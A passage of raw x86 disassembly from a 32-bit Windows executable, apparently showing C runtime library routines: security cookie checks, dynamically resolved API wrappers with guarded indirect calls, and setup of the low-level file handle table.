  405815:	ff 15 c0 c0 40 00    	call   *0x40c0c0
  40581b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40581e:	33 cd                	xor    %ebp,%ecx
  405820:	5e                   	pop    %esi
  405821:	e8 a2 bf ff ff       	call   0x4017c8
  405826:	8b e5                	mov    %ebp,%esp
  405828:	5d                   	pop    %ebp
  405829:	c2 04 00             	ret    $0x4
  40582c:	8b ff                	mov    %edi,%edi
  40582e:	55                   	push   %ebp
  40582f:	8b ec                	mov    %esp,%ebp
  405831:	51                   	push   %ecx
  405832:	a1 04 30 41 00       	mov    0x413004,%eax
  405837:	33 c5                	xor    %ebp,%eax
  405839:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40583c:	56                   	push   %esi
  40583d:	68 c8 d1 40 00       	push   $0x40d1c8
  405842:	68 c0 d1 40 00       	push   $0x40d1c0
  405847:	68 84 c2 40 00       	push   $0x40c284
  40584c:	6a 04                	push   $0x4
  40584e:	e8 6c fe ff ff       	call   0x4056bf
  405853:	83 c4 10             	add    $0x10,%esp
  405856:	8b f0                	mov    %eax,%esi
  405858:	ff 75 08             	push   0x8(%ebp)
  40585b:	85 f6                	test   %esi,%esi
  40585d:	74 0c                	je     0x40586b
  40585f:	8b ce                	mov    %esi,%ecx
  405861:	ff 15 60 c1 40 00    	call   *0x40c160
  405867:	ff d6                	call   *%esi
  405869:	eb 06                	jmp    0x405871
  40586b:	ff 15 cc c0 40 00    	call   *0x40c0cc
  405871:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405874:	33 cd                	xor    %ebp,%ecx
  405876:	5e                   	pop    %esi
  405877:	e8 4c bf ff ff       	call   0x4017c8
  40587c:	8b e5                	mov    %ebp,%esp
  40587e:	5d                   	pop    %ebp
  40587f:	c2 04 00             	ret    $0x4
  405882:	8b ff                	mov    %edi,%edi
  405884:	55                   	push   %ebp
  405885:	8b ec                	mov    %esp,%ebp
  405887:	51                   	push   %ecx
  405888:	a1 04 30 41 00       	mov    0x413004,%eax
  40588d:	33 c5                	xor    %ebp,%eax
  40588f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405892:	56                   	push   %esi
  405893:	68 d0 d1 40 00       	push   $0x40d1d0
  405898:	68 c8 d1 40 00       	push   $0x40d1c8
  40589d:	68 8c c2 40 00       	push   $0x40c28c
  4058a2:	6a 05                	push   $0x5
  4058a4:	e8 16 fe ff ff       	call   0x4056bf
  4058a9:	83 c4 10             	add    $0x10,%esp
  4058ac:	8b f0                	mov    %eax,%esi
  4058ae:	ff 75 08             	push   0x8(%ebp)
  4058b1:	85 f6                	test   %esi,%esi
  4058b3:	74 0c                	je     0x4058c1
  4058b5:	8b ce                	mov    %esi,%ecx
  4058b7:	ff 15 60 c1 40 00    	call   *0x40c160
  4058bd:	ff d6                	call   *%esi
  4058bf:	eb 06                	jmp    0x4058c7
  4058c1:	ff 15 c4 c0 40 00    	call   *0x40c0c4
  4058c7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4058ca:	33 cd                	xor    %ebp,%ecx
  4058cc:	5e                   	pop    %esi
  4058cd:	e8 f6 be ff ff       	call   0x4017c8
  4058d2:	8b e5                	mov    %ebp,%esp
  4058d4:	5d                   	pop    %ebp
  4058d5:	c2 04 00             	ret    $0x4
  4058d8:	8b ff                	mov    %edi,%edi
  4058da:	55                   	push   %ebp
  4058db:	8b ec                	mov    %esp,%ebp
  4058dd:	51                   	push   %ecx
  4058de:	a1 04 30 41 00       	mov    0x413004,%eax
  4058e3:	33 c5                	xor    %ebp,%eax
  4058e5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4058e8:	56                   	push   %esi
  4058e9:	68 d8 d1 40 00       	push   $0x40d1d8
  4058ee:	68 d0 d1 40 00       	push   $0x40d1d0
  4058f3:	68 a0 c2 40 00       	push   $0x40c2a0
  4058f8:	6a 06                	push   $0x6
  4058fa:	e8 c0 fd ff ff       	call   0x4056bf
  4058ff:	83 c4 10             	add    $0x10,%esp
  405902:	8b f0                	mov    %eax,%esi
  405904:	ff 75 0c             	push   0xc(%ebp)
  405907:	ff 75 08             	push   0x8(%ebp)
  40590a:	85 f6                	test   %esi,%esi
  40590c:	74 0c                	je     0x40591a
  40590e:	8b ce                	mov    %esi,%ecx
  405910:	ff 15 60 c1 40 00    	call   *0x40c160
  405916:	ff d6                	call   *%esi
  405918:	eb 06                	jmp    0x405920
  40591a:	ff 15 c8 c0 40 00    	call   *0x40c0c8
  405920:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405923:	33 cd                	xor    %ebp,%ecx
  405925:	5e                   	pop    %esi
  405926:	e8 9d be ff ff       	call   0x4017c8
  40592b:	8b e5                	mov    %ebp,%esp
  40592d:	5d                   	pop    %ebp
  40592e:	c2 08 00             	ret    $0x8
  405931:	8b ff                	mov    %edi,%edi
  405933:	55                   	push   %ebp
  405934:	8b ec                	mov    %esp,%ebp
  405936:	51                   	push   %ecx
  405937:	a1 04 30 41 00       	mov    0x413004,%eax
  40593c:	33 c5                	xor    %ebp,%eax
  40593e:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405941:	56                   	push   %esi
  405942:	68 fc d1 40 00       	push   $0x40d1fc
  405947:	68 f4 d1 40 00       	push   $0x40d1f4
  40594c:	68 b4 c2 40 00       	push   $0x40c2b4
  405951:	6a 14                	push   $0x14
  405953:	e8 67 fd ff ff       	call   0x4056bf
  405958:	8b f0                	mov    %eax,%esi
  40595a:	83 c4 10             	add    $0x10,%esp
  40595d:	85 f6                	test   %esi,%esi
  40595f:	74 15                	je     0x405976
  405961:	ff 75 10             	push   0x10(%ebp)
  405964:	8b ce                	mov    %esi,%ecx
  405966:	ff 75 0c             	push   0xc(%ebp)
  405969:	ff 75 08             	push   0x8(%ebp)
  40596c:	ff 15 60 c1 40 00    	call   *0x40c160
  405972:	ff d6                	call   *%esi
  405974:	eb 0c                	jmp    0x405982
  405976:	ff 75 0c             	push   0xc(%ebp)
  405979:	ff 75 08             	push   0x8(%ebp)
  40597c:	ff 15 bc c0 40 00    	call   *0x40c0bc
  405982:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405985:	33 cd                	xor    %ebp,%ecx
  405987:	5e                   	pop    %esi
  405988:	e8 3b be ff ff       	call   0x4017c8
  40598d:	8b e5                	mov    %ebp,%esp
  40598f:	5d                   	pop    %ebp
  405990:	c2 0c 00             	ret    $0xc
  405993:	8b ff                	mov    %edi,%edi
  405995:	55                   	push   %ebp
  405996:	8b ec                	mov    %esp,%ebp
  405998:	51                   	push   %ecx
  405999:	a1 04 30 41 00       	mov    0x413004,%eax
  40599e:	33 c5                	xor    %ebp,%eax
  4059a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4059a3:	56                   	push   %esi
  4059a4:	68 04 d2 40 00       	push   $0x40d204
  4059a9:	68 fc d1 40 00       	push   $0x40d1fc
  4059ae:	68 04 d2 40 00       	push   $0x40d204
  4059b3:	6a 16                	push   $0x16
  4059b5:	e8 05 fd ff ff       	call   0x4056bf
  4059ba:	8b f0                	mov    %eax,%esi
  4059bc:	83 c4 10             	add    $0x10,%esp
  4059bf:	85 f6                	test   %esi,%esi
  4059c1:	74 27                	je     0x4059ea
  4059c3:	ff 75 28             	push   0x28(%ebp)
  4059c6:	8b ce                	mov    %esi,%ecx
  4059c8:	ff 75 24             	push   0x24(%ebp)
  4059cb:	ff 75 20             	push   0x20(%ebp)
  4059ce:	ff 75 1c             	push   0x1c(%ebp)
  4059d1:	ff 75 18             	push   0x18(%ebp)
  4059d4:	ff 75 14             	push   0x14(%ebp)
  4059d7:	ff 75 10             	push   0x10(%ebp)
  4059da:	ff 75 0c             	push   0xc(%ebp)
  4059dd:	ff 75 08             	push   0x8(%ebp)
  4059e0:	ff 15 60 c1 40 00    	call   *0x40c160
  4059e6:	ff d6                	call   *%esi
  4059e8:	eb 20                	jmp    0x405a0a
  4059ea:	ff 75 1c             	push   0x1c(%ebp)
  4059ed:	ff 75 18             	push   0x18(%ebp)
  4059f0:	ff 75 14             	push   0x14(%ebp)
  4059f3:	ff 75 10             	push   0x10(%ebp)
  4059f6:	ff 75 0c             	push   0xc(%ebp)
  4059f9:	6a 00                	push   $0x0
  4059fb:	ff 75 08             	push   0x8(%ebp)
  4059fe:	e8 18 00 00 00       	call   0x405a1b
  405a03:	50                   	push   %eax
  405a04:	ff 15 20 c1 40 00    	call   *0x40c120
  405a0a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405a0d:	33 cd                	xor    %ebp,%ecx
  405a0f:	5e                   	pop    %esi
  405a10:	e8 b3 bd ff ff       	call   0x4017c8
  405a15:	8b e5                	mov    %ebp,%esp
  405a17:	5d                   	pop    %ebp
  405a18:	c2 24 00             	ret    $0x24
  405a1b:	8b ff                	mov    %edi,%edi
  405a1d:	55                   	push   %ebp
  405a1e:	8b ec                	mov    %esp,%ebp
  405a20:	51                   	push   %ecx
  405a21:	a1 04 30 41 00       	mov    0x413004,%eax
  405a26:	33 c5                	xor    %ebp,%eax
  405a28:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a2b:	56                   	push   %esi
  405a2c:	68 1c d2 40 00       	push   $0x40d21c
  405a31:	68 14 d2 40 00       	push   $0x40d214
  405a36:	68 1c d2 40 00       	push   $0x40d21c
  405a3b:	6a 18                	push   $0x18
  405a3d:	e8 7d fc ff ff       	call   0x4056bf
  405a42:	8b f0                	mov    %eax,%esi
  405a44:	83 c4 10             	add    $0x10,%esp
  405a47:	85 f6                	test   %esi,%esi
  405a49:	74 12                	je     0x405a5d
  405a4b:	ff 75 0c             	push   0xc(%ebp)
  405a4e:	8b ce                	mov    %esi,%ecx
  405a50:	ff 75 08             	push   0x8(%ebp)
  405a53:	ff 15 60 c1 40 00    	call   *0x40c160
  405a59:	ff d6                	call   *%esi
  405a5b:	eb 09                	jmp    0x405a66
  405a5d:	ff 75 08             	push   0x8(%ebp)
  405a60:	e8 ce 21 00 00       	call   0x407c33
  405a65:	59                   	pop    %ecx
  405a66:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405a69:	33 cd                	xor    %ebp,%ecx
  405a6b:	5e                   	pop    %esi
  405a6c:	e8 57 bd ff ff       	call   0x4017c8
  405a71:	8b e5                	mov    %ebp,%esp
  405a73:	5d                   	pop    %ebp
  405a74:	c2 08 00             	ret    $0x8
  405a77:	a1 04 30 41 00       	mov    0x413004,%eax
  405a7c:	57                   	push   %edi
  405a7d:	6a 20                	push   $0x20
  405a7f:	83 e0 1f             	and    $0x1f,%eax
  405a82:	bf c8 3f 41 00       	mov    $0x413fc8,%edi
  405a87:	59                   	pop    %ecx
  405a88:	2b c8                	sub    %eax,%ecx
  405a8a:	33 c0                	xor    %eax,%eax
  405a8c:	d3 c8                	ror    %cl,%eax
  405a8e:	33 05 04 30 41 00    	xor    0x413004,%eax
  405a94:	6a 20                	push   $0x20
  405a96:	59                   	pop    %ecx
  405a97:	f3 ab                	rep stos %eax,%es:(%edi)
  405a99:	b0 01                	mov    $0x1,%al
  405a9b:	5f                   	pop    %edi
  405a9c:	c3                   	ret
  405a9d:	8b ff                	mov    %edi,%edi
  405a9f:	55                   	push   %ebp
  405aa0:	8b ec                	mov    %esp,%ebp
  405aa2:	51                   	push   %ecx
  405aa3:	51                   	push   %ecx
  405aa4:	a1 04 30 41 00       	mov    0x413004,%eax
  405aa9:	33 c5                	xor    %ebp,%eax
  405aab:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405aae:	8b 0d 48 40 41 00    	mov    0x414048,%ecx
  405ab4:	85 c9                	test   %ecx,%ecx
  405ab6:	74 0a                	je     0x405ac2
  405ab8:	33 c0                	xor    %eax,%eax
  405aba:	83 f9 01             	cmp    $0x1,%ecx
  405abd:	0f 94 c0             	sete   %al
  405ac0:	eb 54                	jmp    0x405b16
  405ac2:	56                   	push   %esi
  405ac3:	68 e0 d1 40 00       	push   $0x40d1e0
  405ac8:	68 d8 d1 40 00       	push   $0x40d1d8
  405acd:	68 e0 d1 40 00       	push   $0x40d1e0
  405ad2:	6a 08                	push   $0x8
  405ad4:	e8 e6 fb ff ff       	call   0x4056bf
  405ad9:	8b f0                	mov    %eax,%esi
  405adb:	83 c4 10             	add    $0x10,%esp
  405ade:	85 f6                	test   %esi,%esi
  405ae0:	74 27                	je     0x405b09
  405ae2:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  405ae6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405ae9:	6a 00                	push   $0x0
  405aeb:	50                   	push   %eax
  405aec:	8b ce                	mov    %esi,%ecx
  405aee:	ff 15 60 c1 40 00    	call   *0x40c160
  405af4:	ff d6                	call   *%esi
  405af6:	83 f8 7a             	cmp    $0x7a,%eax
  405af9:	75 0e                	jne    0x405b09
  405afb:	33 c9                	xor    %ecx,%ecx
  405afd:	ba 48 40 41 00       	mov    $0x414048,%edx
  405b02:	41                   	inc    %ecx
  405b03:	87 0a                	xchg   %ecx,(%edx)
  405b05:	b0 01                	mov    $0x1,%al
  405b07:	eb 0c                	jmp    0x405b15
  405b09:	6a 02                	push   $0x2
  405b0b:	58                   	pop    %eax
  405b0c:	b9 48 40 41 00       	mov    $0x414048,%ecx
  405b11:	87 01                	xchg   %eax,(%ecx)
  405b13:	32 c0                	xor    %al,%al
  405b15:	5e                   	pop    %esi
  405b16:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  405b19:	33 cd                	xor    %ebp,%ecx
  405b1b:	e8 a8 bc ff ff       	call   0x4017c8
  405b20:	8b e5                	mov    %ebp,%esp
  405b22:	5d                   	pop    %ebp
  405b23:	c3                   	ret
  405b24:	8b ff                	mov    %edi,%edi
  405b26:	55                   	push   %ebp
  405b27:	8b ec                	mov    %esp,%ebp
  405b29:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  405b2d:	75 27                	jne    0x405b56
  405b2f:	56                   	push   %esi
  405b30:	be 78 3f 41 00       	mov    $0x413f78,%esi
  405b35:	83 3e 00             	cmpl   $0x0,(%esi)
  405b38:	74 10                	je     0x405b4a
  405b3a:	83 3e ff             	cmpl   $0xffffffff,(%esi)
  405b3d:	74 08                	je     0x405b47
  405b3f:	ff 36                	push   (%esi)
  405b41:	ff 15 d0 c0 40 00    	call   *0x40c0d0
  405b47:	83 26 00             	andl   $0x0,(%esi)
  405b4a:	83 c6 04             	add    $0x4,%esi
  405b4d:	81 fe c8 3f 41 00    	cmp    $0x413fc8,%esi
  405b53:	75 e0                	jne    0x405b35
  405b55:	5e                   	pop    %esi
  405b56:	b0 01                	mov    $0x1,%al
  405b58:	5d                   	pop    %ebp
  405b59:	c3                   	ret
  405b5a:	8b ff                	mov    %edi,%edi
  405b5c:	55                   	push   %ebp
  405b5d:	8b ec                	mov    %esp,%ebp
  405b5f:	51                   	push   %ecx
  405b60:	51                   	push   %ecx
  405b61:	53                   	push   %ebx
  405b62:	57                   	push   %edi
  405b63:	6a 30                	push   $0x30
  405b65:	6a 40                	push   $0x40
  405b67:	e8 6c e3 ff ff       	call   0x403ed8
  405b6c:	8b f8                	mov    %eax,%edi
  405b6e:	33 db                	xor    %ebx,%ebx
  405b70:	89 7d f8             	mov    %edi,-0x8(%ebp)
  405b73:	59                   	pop    %ecx
  405b74:	59                   	pop    %ecx
  405b75:	85 ff                	test   %edi,%edi
  405b77:	75 04                	jne    0x405b7d
  405b79:	8b fb                	mov    %ebx,%edi
  405b7b:	eb 48                	jmp    0x405bc5
  405b7d:	8d 87 00 0c 00 00    	lea    0xc00(%edi),%eax
  405b83:	3b f8                	cmp    %eax,%edi
  405b85:	74 3e                	je     0x405bc5
  405b87:	56                   	push   %esi
  405b88:	8d 77 20             	lea    0x20(%edi),%esi
  405b8b:	8b f8                	mov    %eax,%edi
  405b8d:	53                   	push   %ebx
  405b8e:	68 a0 0f 00 00       	push   $0xfa0
  405b93:	8d 46 e0             	lea    -0x20(%esi),%eax
  405b96:	50                   	push   %eax
  405b97:	e8 95 fd ff ff       	call   0x405931
  405b9c:	83 4e f8 ff          	orl    $0xffffffff,-0x8(%esi)
  405ba0:	89 1e                	mov    %ebx,(%esi)
  405ba2:	8d 76 30             	lea    0x30(%esi),%esi
  405ba5:	89 5e d4             	mov    %ebx,-0x2c(%esi)
  405ba8:	8d 46 e0             	lea    -0x20(%esi),%eax
  405bab:	c7 46 d8 00 00 0a 0a 	movl   $0xa0a0000,-0x28(%esi)
  405bb2:	c6 46 dc 0a          	movb   $0xa,-0x24(%esi)
  405bb6:	80 66 dd f8          	andb   $0xf8,-0x23(%esi)
  405bba:	88 5e de             	mov    %bl,-0x22(%esi)
  405bbd:	3b c7                	cmp    %edi,%eax
  405bbf:	75 cc                	jne    0x405b8d
  405bc1:	8b 7d f8             	mov    -0x8(%ebp),%edi
  405bc4:	5e                   	pop    %esi
  405bc5:	53                   	push   %ebx
  405bc6:	e8 42 e2 ff ff       	call   0x403e0d
  405bcb:	59                   	pop    %ecx
  405bcc:	8b c7                	mov    %edi,%eax
  405bce:	5f                   	pop    %edi
  405bcf:	5b                   	pop    %ebx
  405bd0:	8b e5                	mov    %ebp,%esp
  405bd2:	5d                   	pop    %ebp
  405bd3:	c3                   	ret
  405bd4:	8b ff                	mov    %edi,%edi
  405bd6:	55                   	push   %ebp
  405bd7:	8b ec                	mov    %esp,%ebp
  405bd9:	56                   	push   %esi
  405bda:	8b 75 08             	mov    0x8(%ebp),%esi
  405bdd:	85 f6                	test   %esi,%esi
  405bdf:	74 25                	je     0x405c06
  405be1:	53                   	push   %ebx
  405be2:	8d 9e 00 0c 00 00    	lea    0xc00(%esi),%ebx
  405be8:	57                   	push   %edi
  405be9:	8b fe                	mov    %esi,%edi
  405beb:	3b f3                	cmp    %ebx,%esi
  405bed:	74 0e                	je     0x405bfd
  405bef:	57                   	push   %edi
  405bf0:	ff 15 b8 c0 40 00    	call   *0x40c0b8
  405bf6:	83 c7 30             	add    $0x30,%edi
  405bf9:	3b fb                	cmp    %ebx,%edi
  405bfb:	75 f2                	jne    0x405bef
  405bfd:	56                   	push   %esi
  405bfe:	e8 0a e2 ff ff       	call   0x403e0d
  405c03:	59                   	pop    %ecx
  405c04:	5f                   	pop    %edi
  405c05:	5b                   	pop    %ebx
  405c06:	5e                   	pop    %esi
  405c07:	5d                   	pop    %ebp
  405c08:	c3                   	ret
  405c09:	6a 14                	push   $0x14
  405c0b:	68 88 18 41 00       	push   $0x411888
  405c10:	e8 fb c4 ff ff       	call   0x402110
  405c15:	81 7d 08 00 20 00 00 	cmpl   $0x2000,0x8(%ebp)
  405c1c:	1b c0                	sbb    %eax,%eax
  405c1e:	f7 d8                	neg    %eax
  405c20:	75 17                	jne    0x405c39
  405c22:	e8 14 ec ff ff       	call   0x40483b
  405c27:	6a 09                	push   $0x9
  405c29:	5e                   	pop    %esi
  405c2a:	89 30                	mov    %esi,(%eax)
  405c2c:	e8 12 ea ff ff       	call   0x404643
  405c31:	8b c6                	mov    %esi,%eax
  405c33:	e8 1e c5 ff ff       	call   0x402156
  405c38:	c3                   	ret
  405c39:	33 f6                	xor    %esi,%esi
  405c3b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  405c3e:	6a 07                	push   $0x7
  405c40:	e8 1b fa ff ff       	call   0x405660
  405c45:	59                   	pop    %ecx
  405c46:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405c49:	8b fe                	mov    %esi,%edi
  405c4b:	a1 50 42 41 00       	mov    0x414250,%eax
  405c50:	89 7d e0             	mov    %edi,-0x20(%ebp)
  405c53:	39 45 08             	cmp    %eax,0x8(%ebp)
  405c56:	7c 1f                	jl     0x405c77
  405c58:	39 34 bd 50 40 41 00 	cmp    %esi,0x414050(,%edi,4)
  405c5f:	75 31                	jne    0x405c92
  405c61:	e8 f4 fe ff ff       	call   0x405b5a
  405c66:	89 04 bd 50 40 41 00 	mov    %eax,0x414050(,%edi,4)
  405c6d:	85 c0                	test   %eax,%eax
  405c6f:	75 14                	jne    0x405c85
  405c71:	6a 0c                	push   $0xc
  405c73:	5e                   	pop    %esi
  405c74:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  405c77:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405c7e:	e8 15 00 00 00       	call   0x405c98
  405c83:	eb ac                	jmp    0x405c31
  405c85:	a1 50 42 41 00       	mov    0x414250,%eax
  405c8a:	83 c0 40             	add    $0x40,%eax
  405c8d:	a3 50 42 41 00       	mov    %eax,0x414250
  405c92:	47                   	inc    %edi
  405c93:	eb bb                	jmp    0x405c50
  405c95:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  405c98:	6a 07                	push   $0x7
  405c9a:	e8 09 fa ff ff       	call   0x4056a8
  405c9f:	59                   	pop    %ecx
  405ca0:	c3                   	ret
  405ca1:	8b ff                	mov    %edi,%edi
  405ca3:	55                   	push   %ebp
  405ca4:	8b ec                	mov    %esp,%ebp
  405ca6:	8b 45 08             	mov    0x8(%ebp),%eax
  405ca9:	8b c8                	mov    %eax,%ecx
  405cab:	83 e0 3f             	and    $0x3f,%eax
  405cae:	c1 f9 06             	sar    $0x6,%ecx
  405cb1:	6b c0 30             	imul   $0x30,%eax,%eax
  405cb4:	03 04 8d 50 40 41 00 	add    0x414050(,%ecx,4),%eax
  405cbb:	50                   	push   %eax
  405cbc:	ff 15 b0 c0 40 00    	call   *0x40c0b0
  405cc2:	5d                   	pop    %ebp
  405cc3:	c3                   	ret
  405cc4:	8b ff                	mov    %edi,%edi
  405cc6:	55                   	push   %ebp
  405cc7:	8b ec                	mov    %esp,%ebp
  405cc9:	8b 45 08             	mov    0x8(%ebp),%eax
  405ccc:	8b c8                	mov    %eax,%ecx
  405cce:	83 e0 3f             	and    $0x3f,%eax
  405cd1:	c1 f9 06             	sar    $0x6,%ecx
  405cd4:	6b c0 30             	imul   $0x30,%eax,%eax
  405cd7:	03 04 8d 50 40 41 00 	add    0x414050(,%ecx,4),%eax
  405cde:	50                   	push   %eax
  405cdf:	ff 15 b4 c0 40 00    	call   *0x40c0b4
  405ce5:	5d                   	pop    %ebp
  405ce6:	c3                   	ret
  405ce7:	8b ff                	mov    %edi,%edi
  405ce9:	55                   	push   %ebp
  405cea:	8b ec                	mov    %esp,%ebp
  405cec:	53                   	push   %ebx
  405ced:	56                   	push   %esi
  405cee:	8b 75 08             	mov    0x8(%ebp),%esi
  405cf1:	57                   	push   %edi
  405cf2:	85 f6                	test   %esi,%esi
  405cf4:	78 67                	js     0x405d5d
  405cf6:	3b 35 50 42 41 00    	cmp    0x414250,%esi
  405cfc:	73 5f                	jae    0x405d5d
  405cfe:	8b c6                	mov    %esi,%eax
  405d00:	8b fe                	mov    %esi,%edi
  405d02:	83 e0 3f             	and    $0x3f,%eax
  405d05:	c1 ff 06             	sar    $0x6,%edi
  405d08:	6b d8 30             	imul   $0x30,%eax,%ebx
  405d0b:	8b 04 bd 50 40 41 00 	mov    0x414050(,%edi,4),%eax
  405d12:	f6 44 03 28 01       	testb  $0x1,0x28(%ebx,%eax,1)
  405d17:	74 44                	je     0x405d5d
  405d19:	83 7c 03 18 ff       	cmpl   $0xffffffff,0x18(%ebx,%eax,1)
  405d1e:	74 3d                	je     0x405d5d
  405d20:	e8 d5 d0 ff ff       	call   0x402dfa
  405d25:	83 f8 01             	cmp    $0x1,%eax
  405d28:	75 23                	jne    0x405d4d
  405d2a:	33 c0                	xor    %eax,%eax
  405d2c:	2b f0                	sub    %eax,%esi
  405d2e:	74 14                	je     0x405d44
  405d30:	83 ee 01             	sub    $0x1,%esi
  405d33:	74 0a                	je     0x405d3f
  405d35:	83 ee 01             	sub    $0x1,%esi
  405d38:	75 13                	jne    0x405d4d
  405d3a:	50                   	push   %eax
  405d3b:	6a f4                	push   $0xfffffff4
  405d3d:	eb 08                	jmp    0x405d47
  405d3f:	50                   	push   %eax
  405d40:	6a f5                	push   $0xfffffff5
  405d42:	eb 03                	jmp    0x405d47
  405d44:	50                   	push   %eax
  405d45:	6a f6                	push   $0xfffffff6
  405d47:	ff 15 24 c1 40 00    	call   *0x40c124
  405d4d:	8b 04 bd 50 40 41 00 	mov    0x414050(,%edi,4),%eax
  405d54:	83 4c 03 18 ff       	orl    $0xffffffff,0x18(%ebx,%eax,1)
  405d59:	33 c0                	xor    %eax,%eax
  405d5b:	eb 16                	jmp    0x405d73
  405d5d:	e8 d9 ea ff ff       	call   0x40483b
  405d62:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  405d68:	e8 bb ea ff ff       	call   0x404828
  405d6d:	83 20 00             	andl   $0x0,(%eax)
  405d70:	83 c8 ff             	or     $0xffffffff,%eax
  405d73:	5f                   	pop    %edi
  405d74:	5e                   	pop    %esi
  405d75:	5b                   	pop    %ebx
  405d76:	5d                   	pop    %ebp
  405d77:	c3                   	ret
  405d78:	8b ff                	mov    %edi,%edi
  405d7a:	55                   	push   %ebp
  405d7b:	8b ec                	mov    %esp,%ebp
  405d7d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405d80:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  405d83:	75 15                	jne    0x405d9a
  405d85:	e8 9e ea ff ff       	call   0x404828
  405d8a:	83 20 00             	andl   $0x0,(%eax)
  405d8d:	e8 a9 ea ff ff       	call   0x40483b
  405d92:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  405d98:	eb 43                	jmp    0x405ddd
  405d9a:	85 c9                	test   %ecx,%ecx
  405d9c:	78 27                	js     0x405dc5
  405d9e:	3b 0d 50 42 41 00    	cmp    0x414250,%ecx
  405da4:	73 1f                	jae    0x405dc5
  405da6:	8b c1                	mov    %ecx,%eax
  405da8:	83 e1 3f             	and    $0x3f,%ecx
  405dab:	c1 f8 06             	sar    $0x6,%eax
  405dae:	6b c9 30             	imul   $0x30,%ecx,%ecx
  405db1:	8b 04 85 50 40 41 00 	mov    0x414050(,%eax,4),%eax
  405db8:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  405dbd:	74 06                	je     0x405dc5
  405dbf:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  405dc3:	5d                   	pop    %ebp
  405dc4:	c3                   	ret
  405dc5:	e8 5e ea ff ff       	call   0x404828
  405dca:	83 20 00             	andl   $0x0,(%eax)
  405dcd:	e8 69 ea ff ff       	call   0x40483b
  405dd2:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  405dd8:	e8 66 e8 ff ff       	call   0x404643
  405ddd:	83 c8 ff             	or     $0xffffffff,%eax
  405de0:	5d                   	pop    %ebp
  405de1:	c3                   	ret
  405de2:	8b ff                	mov    %edi,%edi
  405de4:	55                   	push   %ebp
  405de5:	8b ec                	mov    %esp,%ebp
  405de7:	83 ec 48             	sub    $0x48,%esp
  405dea:	8d 45 b8             	lea    -0x48(%ebp),%eax
  405ded:	50                   	push   %eax
  405dee:	ff 15 9c c0 40 00    	call   *0x40c09c
  405df4:	66 83 7d ea 00       	cmpw   $0x0,-0x16(%ebp)
  405df9:	0f 84 95 00 00 00    	je     0x405e94
  405dff:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405e02:	85 c0                	test   %eax,%eax
  405e04:	0f 84 8a 00 00 00    	je     0x405e94
  405e0a:	53                   	push   %ebx
  405e0b:	56                   	push   %esi
  405e0c:	8b 30                	mov    (%eax),%esi
  405e0e:	8d 58 04             	lea    0x4(%eax),%ebx
  405e11:	8d 04 33             	lea    (%ebx,%esi,1),%eax
  405e14:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405e17:	b8 00 20 00 00       	mov    $0x2000,%eax
  405e1c:	3b f0                	cmp    %eax,%esi
  405e1e:	7c 02                	jl     0x405e22
  405e20:	8b f0                	mov    %eax,%esi
  405e22:	56                   	push   %esi
  405e23:	e8 e1 fd ff ff       	call   0x405c09
  405e28:	a1 50 42 41 00       	mov    0x414250,%eax
  405e2d:	59                   	pop    %ecx
  405e2e:	3b f0                	cmp    %eax,%esi
  405e30:	7e 02                	jle    0x405e34
  405e32:	8b f0                	mov    %eax,%esi
  405e34:	57                   	push   %edi
  405e35:	33 ff                	xor    %edi,%edi
  405e37:	85 f6                	test   %esi,%esi
  405e39:	74 56                	je     0x405e91
  405e3b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405e3e:	8b 08                	mov    (%eax),%ecx
  405e40:	83 f9 ff             	cmp    $0xffffffff,%ecx
  405e43:	74 40                	je     0x405e85
  405e45:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  405e48:	74 3b                	je     0x405e85
  405e4a:	8a 13                	mov    (%ebx),%dl
  405e4c:	f6 c2 01             	test   $0x1,%dl
  405e4f:	74 34                	je     0x405e85
  405e51:	f6 c2 08             	test   $0x8,%dl
  405e54:	75 0b                	jne    0x405e61
  405e56:	51                   	push   %ecx
  405e57:	ff 15 28 c1 40 00    	call   *0x40c128
  405e5d:	85 c0                	test   %eax,%eax
  405e5f:	74 21                	je     0x405e82
  405e61:	8b c7                	mov    %edi,%eax
  405e63:	8b cf                	mov    %edi,%ecx
  405e65:	83 e0 3f             	and    $0x3f,%eax
  405e68:	c1 f9 06             	sar    $0x6,%ecx
  405e6b:	6b d0 30             	imul   $0x30,%eax,%edx
  405e6e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405e71:	03 14 8d 50 40 41 00 	add    0x414050(,%ecx,4),%edx
  405e78:	8b 00                	mov    (%eax),%eax
  405e7a:	89 42 18             	mov    %eax,0x18(%edx)
  405e7d:	8a 03                	mov    (%ebx),%al
  405e7f:	88 42 28             	mov    %al,0x28(%edx)
  405e82:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405e85:	47                   	inc    %edi
  405e86:	83 c0 04             	add    $0x4,%eax
  405e89:	43                   	inc    %ebx
